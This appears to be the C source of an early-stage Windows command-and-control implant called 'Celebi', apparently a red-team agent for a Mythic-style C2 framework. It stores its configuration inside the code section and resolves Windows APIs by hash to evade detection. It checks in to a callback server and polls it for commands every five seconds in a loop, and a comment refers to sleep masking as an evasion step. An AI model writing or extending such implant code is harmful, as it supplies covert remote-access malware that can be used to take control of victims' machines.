#include <windows.h>
#include "headers/celebi.h"
#include "headers/tcg.h"
#include "headers/HTTP.h"

char RAW_PARAMS[1024] __attribute__((section(".text")));

WINBASEAPI HANDLE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMilliseconds);

WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

WINBASEAPI size_t MSVCRT$strlen(const char *str);
WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);

WINBASEAPI int WINAPI USER32$MessageBoxA (HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

FARPROC resolve_unloaded(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL) {
		hModule = KERNEL32$LoadLibraryA(mod);
	}
	return KERNEL32$GetProcAddress(hModule, func);
}

void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http) {
	// Generate checkin payload.
	CheckinRequest checkin = { 0 };
	checkin.payload_uuid = params->payload_uuid;
	char *msg = generate_checkin_message(&checkin);
	
	// Send checkin payload to C2 server.
	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_checkin_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
	
}

void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http) {
	// Generate tasking payload.
	TaskingRequest tasking = { 0 };
	tasking.callback_uuid = params->callback_uuid;
	tasking.tasking_size = 1;
	char *msg = generate_tasking_message(&tasking);
	
	// Send tasking payload to C2 server.
	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
	HttpBody body = {msg, MSVCRT$strlen(msg)};
	HttpResponse response = {0};
	
	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
	
	// If we get a 200 response code, parse the reply.
	if (response.status_code == 200) {
		parse_tasking_reply(&response, reply);
	}
	
	// Free unneeded allocations.
	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
}

void go() {
	HttpHandle *http;
	AgentParams params = { 0 };
	CheckinReply checkin_reply = { 0 };
	
	unpack_params(RAW_PARAMS, &params);
	
	http = HttpInit(params.callback_https);
	
	perform_checkin(&params, &checkin_reply, http);
	
	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
		free_params(&params);
		free_checkin_reply(&checkin_reply);
		USER32$MessageBoxA(NULL, "Checkin failed :(", "Celebi", MB_OKCANCEL);
		return;
	}
	
	USER32$MessageBoxA(NULL, "Successful Checkin!", "Celebi", MB_OKCANCEL);
	params.callback_uuid = checkin_reply.callback_uuid;
	
	while (1) {
		// Look ma, no masking!
		TaskingReply tasking_reply = { 0 };
		perform_tasking(&params, &tasking_reply, http);
		
		USER32$MessageBoxA(NULL, "Received commands from C2!", "Celebi", MB_OKCANCEL);
		
		free_tasking_reply(&tasking_reply);
		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
	}

	HttpDestroy(http);
	free_params(&params);
	free_checkin_reply(&checkin_reply);
}
